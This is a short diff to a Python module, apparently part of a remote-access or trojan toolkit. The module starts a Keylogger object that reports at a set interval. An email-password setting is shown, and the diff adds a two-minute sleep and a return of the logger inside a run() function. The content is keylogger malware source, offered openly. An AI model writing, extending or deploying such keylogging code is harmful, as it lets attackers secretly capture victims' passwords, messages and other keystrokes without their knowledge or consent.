@@ -19,6 +19,8 @@ EMAIL_PASSWORD = "password_here"
 def run(**args):
     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")   
     keylogger.start()
+    time.sleep(120)
+    return keylogger.__str__
 
 class Keylogger:
     def __init__(self, interval, report_method="file"):
